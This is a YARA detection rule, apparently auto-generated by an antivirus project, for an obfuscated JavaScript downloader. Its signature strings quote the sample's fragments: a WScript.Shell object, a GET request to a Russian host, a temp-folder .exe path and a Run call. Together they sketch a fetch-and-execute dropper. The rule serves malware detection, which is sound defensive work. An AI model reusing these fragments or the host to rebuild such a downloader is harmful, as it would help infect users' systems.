rule sig_20160330_bffb6e728ce2137c3af94e78dabf5025 {
  meta:
    description = "datamaliciousorder - file 20160330_bffb6e728ce2137c3af94e78dabf5025.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "5f890bb0749b44329e3db5c442577f8a04a528a8861567dc73755f4c60f9a16a"

  strings:
    $s1  = "var BI = function CK() {return WScript[Z0](\"WScript\"+\".Shell\");}(), H = 11;" fullword ascii
    $s2  = "function NK(X, Y0){YX = YX * 1; return X - Y0;};" fullword ascii
    $s3  = "V0[DW](\"GET\", \"http://bigmishki.ru/l3osjf\", false);" fullword ascii
    $s4  = "if (V0[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function Z() {return BI[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"c66DYhgdKHCiM.ex\" + \"e\";};" fullword ascii
    $s6  = "function XO(){return SA + \"\";};" fullword ascii
    $s7  = "function B(G){BI[\"Run\"](G, YX, YX);};" fullword ascii
    $s8  = "function JN() {return ((Y == true) && (Y == BV)) ? 1 : YX;};" fullword ascii
    $s9  = "function R(){return 22;};" fullword ascii
    $s10 = "function BA()" fullword ascii
    $s11 = "var GV = new this[\"Date\"]();" fullword ascii
    $s12 = "return NK(OL, I);" fullword ascii
    $s13 = "}while (AE);" fullword ascii
    $s14 = "function D(){return Z0;};" fullword ascii
    $s15 = "function K(V) {var GX = (1, 2, 3, 4, 5, V); return GX;};" fullword ascii
    $s16 = "Y = true; " fullword ascii
    $s17 = "var Y = false;" fullword ascii
    $s18 = "var K0 = false;" fullword ascii
    $s19 = "BV = true; " fullword ascii
    $s20 = "var BV = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}